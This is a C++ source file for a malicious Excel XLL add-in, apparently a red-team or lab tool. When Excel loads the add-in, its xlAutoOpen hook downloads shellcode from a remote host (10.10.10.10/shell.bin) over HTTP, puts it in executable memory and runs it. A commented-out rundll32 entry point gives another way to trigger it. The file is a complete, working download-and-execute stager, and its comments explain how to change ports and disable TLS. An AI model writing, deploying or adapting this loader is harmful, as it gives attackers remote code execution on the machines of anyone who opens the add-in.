// g++ -std=c++11 DLL_downloadExec.cpp -o Plugin1.xll -shared -lwinhttp -static-libgcc -static-libstdc++ -s
#include <windows.h>
#include <winhttp.h>
#include <vector>

#pragma comment(lib, "winhttp.lib")

// Download shellcode from remote server
std::vector<BYTE> DownloadShellcode(LPCWSTR baseAddress, LPCWSTR filename) {
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;
    BYTE temp[4096]{};

    HINTERNET hSession = WinHttpOpen(NULL,
                                     WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS,
                                     0);

    if (!hSession) return buffer;

    // WinHttpConnect parameters: (Session, Server Address, Port, Reserved)
    // CHANGE: use 'INTERNET_DEFAULT_HTTP_PORT' for HTTP port 80, 'INTERNET_DEFAULT_HTTPS_PORT' for 443
    // For custom ports (like a Python listener), just type the number directly (e.g., 8000)
    HINTERNET hConnect = WinHttpConnect(hSession, baseAddress, INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return buffer;
    }

    // CHANGE: remove WINHTTP_FLAG_SECURE
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", filename,
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            0); // no flags

    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                           WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        WinHttpReceiveResponse(hRequest, NULL)) {

        do {
            ZeroMemory(temp, sizeof(temp));
            if (!WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead))
                break;
            if (bytesRead > 0)
                buffer.insert(buffer.end(), temp, temp + bytesRead);
        } while (bytesRead > 0);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}

// Shellcode executor
void ExecuteShellcode() {
    std::vector<BYTE> shellcode = DownloadShellcode(L"10.10.10.10", L"/shell.bin");

    if (shellcode.empty())
        return;

    LPVOID execMem = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem)
        return;

    memcpy(execMem, shellcode.data(), shellcode.size());
    ((void(*)())execMem)();  // Run the shellcode
}

// --- MAIN ENTRY POINTS ---
// Excel will call this on Add-in load
extern "C" __declspec(dllexport) int WINAPI xlAutoOpen(void) {
    ExecuteShellcode();  // Trigger on Excel load
    return 1;            // Return success to Excel
}

/* // [2] GENERAL DLL ENTRY POINT (for rundll32)
extern "C" __declspec(dllexport) void Run(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    ExecuteShellcode();
}
*/
